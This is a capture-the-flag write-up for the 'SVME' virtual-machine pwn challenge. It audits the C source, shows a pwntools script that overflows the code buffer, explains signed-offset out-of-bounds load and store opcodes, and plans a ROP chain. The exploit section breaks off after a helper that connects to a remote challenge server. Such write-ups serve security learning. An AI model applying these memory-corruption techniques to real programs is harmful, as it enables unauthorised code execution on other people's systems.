## General overview
The SVME binary challenge is a simple implementation of a small virtual machine as presented in Prof. Terence Parr slides in the description of the challenge. We can send 512 bytes of bytecode to the virtual machine and the virtual machine will run all the instructions which we sent to it.

## Binary details
```bash
$ file svme
svme: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.31.so, for GNU/Linux 3.2.0, BuildID[sha1]=ac06c33f16248df7768fed3ecefb7e6a85ec5941, not stripped
```
Enabled protections:
```bash
$ checksec svme
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The provided libc is: `libc 2.31`

## Code audit
### `main.c`
```c
#include <stdbool.h>
#include <unistd.h>
#include "vm.h"

int main(int argc, char *argv[]) {
    int code[128], nread = 0;
    while (nread < sizeof(code)) {
        int ret = read(0, code+nread, sizeof(code)-nread);
        if (ret <= 0) break;
        nread += ret;
    }
    VM *vm = vm_create(code, nread/4, 0);
    vm_exec(vm, 0, true);
    vm_free(vm);
    return 0;
}
```
The very first thing I found was a buffer overflow in `main` while reading our input to the `code` buffer but actually I didn't use it at all for my exploit.
If an attacker sends exacly 128 bytes they will be copied to the `code` buffer and `nread` will be 128. But next time the attacker sends data to the program `code+nread` will cause a buffer overflow because the author does not realize that he is using pointer arithmetic and not simple addition to calculate where to write next to the `code` buffer. And if we carefully craft our payload we can bypass the stack canary too. Below is a simple example triggering the described buffer overflow:

```python
from pwn import *
elf = context.binary = ELF('./svme')
io = gdb.debug('./svme')

# \x12 byte is telling the virtual machine to stop the execution of the program as soon as possible, so we are putting it first inorder to skip 
# the remainding payload that we are sending to avoid segfault in vm_exec function.
info('Skipping the stack canary!')
io.send(b'\x12'+b'\x00'*(128+3))

info('Buffer overflow!')
rbp = b'B'*8
rip = p64(0xdeadbeef)
padding = b'C'*400 # doesn't matter if we exceed 512 bytes the remaining bytes will be discarded.
io.send(rbp + rip + padding)

io.interactive()
```

Our crash!
```c

```

But ASLR+PIE is enabled so at the moment we are sending our payload we don't have any gadget to jump. So I started investigating the virtual machine code.

### `vm.c`
The source code of the implementation of the virtual machine was in a link inside the `Dockerfile`. 
[Source code](https://github.com/parrt/simple-virtual-machine-C/)

```c
typedef struct {
    int returnip;
    int locals[DEFAULT_NUM_LOCALS];
} Context;

typedef struct {
    int *code;
    int code_size;

    // global variable space
    int *globals;
    int nglobals;

    // Operand stack, grows upwards
    int stack[DEFAULT_STACK_SIZE];
    Context call_stack[DEFAULT_CALL_STACK_SIZE];
} VM;
```
We can see in `vm.h` that a program that we run in the virtual machine has a global space for storing global variables and stacks for local variables for calls.
Auditing the `vm.c` source code and trying to see how each instruction is implemented in the virtual machine I found 4 out-of-bounds vulnerabilities which I could use for crafting an exploit.

```c
    case LOAD: // load local or arg
        offset = vm->code[ip++];
        vm->stack[++sp] = vm->call_stack[callsp].locals[offset];
        break;
    case GLOAD: // load from global memory
        addr = vm->code[ip++];
        vm->stack[++sp] = vm->globals[addr];
        break;
    case STORE:
        offset = vm->code[ip++];
        vm->call_stack[callsp].locals[offset] = vm->stack[sp--];
        break;
    case GSTORE:
        addr = vm->code[ip++];
        vm->globals[addr] = vm->stack[sp--];
        break;
```

In each case we have a controllable offset which can be also negative because `addr` & `offset` variables are declared as signed integers. So in the case of load instructions we can nearly arbitrary read values and save them to the stack/globals. And in the case of store instrcutions we can nearly arbitrary write values from the stack to the target. We are limited here because offsets are 32 bit values and our application is 64 bit so we can't reach any address we like.

But the important clue here is that we have a stack address which we can reach with our out-of-bounds vulnerabilities. The `code` pointer is pointing to a buffer on the stack. So we can read the stack address save it to the `vm->stack` and try to overwrite the `vm->globals` variable so that it points to the actual stack inorder to craft a rop chain attack on the fly. We have to do this with steps of two because each address is 64 bit but we can load/save 32 bits at a time.

## Full exploit

elf = context.binary = ELF('svme', checksec = False)
libc = ELF('libc.so.6', checksec = False)

def start():
    gs = '''
        b *vm_exec+1738
    '''

    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        return remote('47.243.140.252', 1337)
    else:
        return process(elf.path)
